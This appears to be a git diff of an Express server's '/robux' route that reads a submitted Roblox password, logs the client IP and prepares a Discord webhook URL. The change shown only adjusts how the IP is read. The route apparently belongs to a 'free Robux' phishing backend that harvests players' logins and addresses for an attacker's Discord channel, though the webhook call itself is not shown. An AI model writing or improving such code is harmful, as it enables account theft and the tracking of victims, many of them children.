@@ -21,7 +21,7 @@ app.post("/robux", async (req, res) => {
     const robloxPwd = req.body.roblox_pwd;
 
     // IP 가져오기
-    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const clientIp = req.ip;
 
     // 디스코드 웹훅 URL
     const webhookUrl = process.env.WEBHOOK_URL;
